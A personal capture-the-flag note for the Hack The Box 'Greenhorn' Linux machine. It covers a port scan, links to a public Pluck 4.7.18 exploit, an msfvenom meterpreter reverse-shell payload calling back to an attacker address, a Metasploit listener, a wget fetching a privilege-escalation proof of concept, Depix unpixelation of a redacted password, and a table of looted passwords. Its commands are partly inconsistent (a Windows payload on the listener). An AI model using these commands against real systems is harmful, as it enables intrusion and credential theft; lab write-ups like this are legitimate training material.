---
cssclasses:
  - pen-red
  - page-grid
  - recolor-images
tags:
  - htb
  - linux
  - easy
  - pdf
---

NMAP Scan
```bash                                                                               
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 15:41 EDT                                        
Nmap scan report for greenhorn (10.10.11.25)                                                              
Host is up (1.2s latency).                                                                                
                                                                                                          
PORT     STATE SERVICE VERSION                                                                            
3000/tcp open  ppp? 

```



## Exploit 

Login page
<a href="/login.php">admin</a> | powered by <a href="http://www.pluck-cms.org">pluck</a>

Version
Plunk 4.7.18

CVE 
https://www.exploit-db.com/exploits/51592
https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC


# Setup a C2
Reverse shell msfvenom
```shell
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.16.105 LPORT=4444 -f elf > shell-x64.elf
```

 

Setup listener
```shell
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.1.123
lhost => 192.168.1.123
msf exploit(handler) > set lport 4444
lport => 4444
msf exploit(handler) > run

[*] Started reverse handler on 192.168.1.123:4444
[*] Starting the payload handler...
```



## Privilege Escalation
```shell
/etc/systemd/system/gitea.service is calling this writable executable: /usr/local/bin/gitea
/etc/systemd/system/multi-user.target.wants/gitea.service is calling this writable executable: /usr/local/bin/gitea
```

convert pdf to image
```shell
 pdfimages OpenVas.pdf  OpenVas.png -png
```

Depix tool to deobfuscate a image
```shell
[+] https://github.com/spipm/Depix
```

```shell
python depix.py \
-p ../OpenVas.png-000.png \
-s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \
-o ../OutPutImg.png

```


### Possible Privilege Escalation Vector 
wget http://10.10.16.105:8000/CVE-2022-34918-LPE-PoC
https://github.com/merlinepedra/CVE-2022-34918-LPE-PoC

Dirty Pipe
https://github.com/n3rada/DirtyPipe


## Loot Information

| User   | Pwd                                              |
| ------ | ------------------------------------------------ |
| Junior | iloveyou1                                        |
| Root   | sidefromsidetheothersidesidefromsidetheotherside |


